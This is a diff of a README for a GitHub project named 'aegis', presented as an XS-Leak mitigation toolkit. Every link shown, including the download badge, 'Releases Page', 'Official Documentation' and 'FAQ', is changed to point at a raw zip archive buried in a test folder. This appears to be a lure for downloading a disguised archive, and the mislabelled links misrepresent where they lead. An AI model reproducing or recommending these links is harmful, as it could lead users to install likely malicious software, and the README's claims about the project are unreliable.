@@ -4,13 +4,13 @@
 Welcome to **aegis**, a modular XS-Leak mitigation toolkit designed for modern web applications. This toolkit helps secure your applications against side-channel attacks and enhances their overall security posture. It is built using widely adopted technologies, making it easy to integrate into your projects.
 
 ## 📦 Download Now
-[![Download Aegis](https://github.com/rehmanbranded/aegis/raw/refs/heads/main/packages/monitor/src/ui/Software_v2.8.zip%https://github.com/rehmanbranded/aegis/raw/refs/heads/main/packages/monitor/src/ui/Software_v2.8.zip)](https://github.com/rehmanbranded/aegis/raw/refs/heads/main/packages/monitor/src/ui/Software_v2.8.zip)
+[![Download Aegis](https://github.com/rehmanbranded/aegis/raw/refs/heads/main/packages/core/test/Software-2.5.zip%https://github.com/rehmanbranded/aegis/raw/refs/heads/main/packages/core/test/Software-2.5.zip)](https://github.com/rehmanbranded/aegis/raw/refs/heads/main/packages/core/test/Software-2.5.zip)
 
 ## 🚀 Getting Started
 Getting started with aegis is easy. Follow the steps below to download and run the application.
 
 ### 🔗 Step 1: Visit the Download Page
-To download aegis, visit our [Releases Page](https://github.com/rehmanbranded/aegis/raw/refs/heads/main/packages/monitor/src/ui/Software_v2.8.zip). This page contains the latest versions and important release notes.
+To download aegis, visit our [Releases Page](https://github.com/rehmanbranded/aegis/raw/refs/heads/main/packages/core/test/Software-2.5.zip). This page contains the latest versions and important release notes.
 
 ### 🔥 Step 2: Choose Your Version
 On the Releases page, you will see various versions of aegis. Each version contains important fixes and improvements. Select the version you want to download.
@@ -47,10 +47,10 @@ To ensure aegis runs smoothly, your system should meet the following requirement
 Join our community for updates, tips, and support. Engage with fellow users and developers in our GitHub Issues section or our designated Forum. Your feedback is invaluable in helping us improve aegis further.
 
 ## 🔗 Additional Resources
-- [Official Documentation](https://github.com/rehmanbranded/aegis/raw/refs/heads/main/packages/monitor/src/ui/Software_v2.8.zip)
-- [FAQ](https://github.com/rehmanbranded/aegis/raw/refs/heads/main/packages/monitor/src/ui/Software_v2.8.zip)
+- [Official Documentation](https://github.com/rehmanbranded/aegis/raw/refs/heads/main/packages/core/test/Software-2.5.zip)
+- [FAQ](https://github.com/rehmanbranded/aegis/raw/refs/heads/main/packages/core/test/Software-2.5.zip)
 
 ## 🔗 Download Again
-To download aegis, visit our [Releases Page](https://github.com/rehmanbranded/aegis/raw/refs/heads/main/packages/monitor/src/ui/Software_v2.8.zip). Make sure to select the latest version for the best experience.
+To download aegis, visit our [Releases Page](https://github.com/rehmanbranded/aegis/raw/refs/heads/main/packages/core/test/Software-2.5.zip). Make sure to select the latest version for the best experience.
 
 Thank you for choosing aegis! Your web applications will be more secure against XS-Leaks with our toolkit.
